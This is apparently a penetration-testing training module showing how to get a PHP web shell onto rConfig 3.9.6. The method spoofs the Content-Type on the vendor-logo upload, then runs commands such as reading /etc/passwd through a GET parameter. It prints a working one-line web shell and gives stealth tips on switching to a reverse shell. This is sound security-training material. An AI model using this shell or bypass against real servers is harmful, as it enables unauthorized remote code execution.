# PHP Web Shells

[PHP](https://www.php.net/) is the most widely deployed server-side scripting language in the world, powering approximately 78.6% of all websites with a known server-side language at the time of writing. Its prevalence makes PHP-based web shells one of the most commonly encountered web shell variants during penetration tests. Any web server identified as running PHP presents a potential path to remote code execution via a PHP shell, provided a file upload vector or other write-to-webroot mechanism can be identified and exploited.

## Identifying the Upload Vector in rConfig

The rConfig 3.9.6 target identified earlier in this module runs on PHP, as confirmed by the `login.php` endpoint and the `X-Powered-By: PHP/7.2.34` response header. Authenticated access to the application is available using the default credentials (`admin:admin`). Navigating to Devices > Vendors and selecting "Add Vendor" reveals a file upload field for the vendor logo, which presents the upload vector for PHP shell delivery.

**[WhiteWinterWolf's PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)** is used for this walkthrough. Download the file or copy the source into a `.php` file on the attack box. The shell accepts commands via a GET parameter and returns output in the browser, providing a clean non-interactive interface for initial access.

## Bypassing the File Type Restriction

rConfig validates the file extension and MIME type of the vendor logo upload, rejecting anything that does not match an expected image format (`.png`, `.jpg`, `.gif`). This client-server validation relies on the `Content-Type` header submitted in the multipart upload request, rather than inspecting the actual file content. This is a server-side check on user-controlled input, making it trivially bypassable with a proxy.

Configure **[Burp Suite](https://portswigger.net/burp)** as the browser proxy (`127.0.0.1:8080`), then attempt to upload the `.php` file through the vendor logo form. Burp intercepts the outbound POST request before it reaches the server. The intercepted request will contain a multipart form body similar to the following:

```
Content-Disposition: form-data; name="vendorLogo"; filename="connect.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
```

Change the `Content-Type` value for the file part from `application/x-php` to `image/gif`:

```
Content-Type: image/gif
```

Forward the modified request. The server inspects the `Content-Type` header value rather than the file contents or extension, accepts the submission as a valid image, and writes the PHP file to the vendor logo directory. A successful upload returns the confirmation message and creates the vendor entry with a broken image placeholder, indicating the server could not render the file as an image but wrote it to disk regardless.

## Accessing and Using the Shell

Navigate directly to the uploaded file's path on the server:

```
https://<TARGET_IP>/images/vendor/connect.php
```

The PHP shell is now accessible in the browser. Issue commands via the GET parameter:

```
https://<TARGET_IP>/images/vendor/connect.php?cmd=id
https://<TARGET_IP>/images/vendor/connect.php?cmd=whoami
https://<TARGET_IP>/images/vendor/connect.php?cmd=cat /etc/passwd
```

The server executes each command as the `apache` user and returns the output inline in the browser response.

## Operational Considerations

Web shells introduce a set of risks and limitations that must be actively managed throughout the engagement:

- **Automatic deletion:** Some web applications purge uploaded files after a defined interval. If the shell disappears mid-engagement, the upload process must be repeated.
- **Limited interactivity:** Chained commands using `&&` or `;` may not behave consistently across web shell implementations. Commands requiring a TTY will fail entirely.
- **Instability:** Non-interactive web shells are subject to HTTP timeouts and can lose state between requests.
- **Evidence trail:** Every command issued through the shell generates an HTTP access log entry on the target server, recording the request path and any URL-encoded command strings. This evidence persists after the engagement ends unless explicitly removed.
- **Evasive assessments:** On black box engagements where stealth is required, the web shell should be used only to deliver and trigger a reverse shell payload. Once that callback is established, delete the PHP file from disk immediately and transition all activity to the reverse shell session.

Documentation discipline is equally important. Record every file uploaded, the exact path where it was stored, the filename used, and a SHA256 or MD5 hash of the file content. Include upload locations and file hashes in the engagement report as evidence of successful exploitation and to support cleanup verification once the engagement concludes.
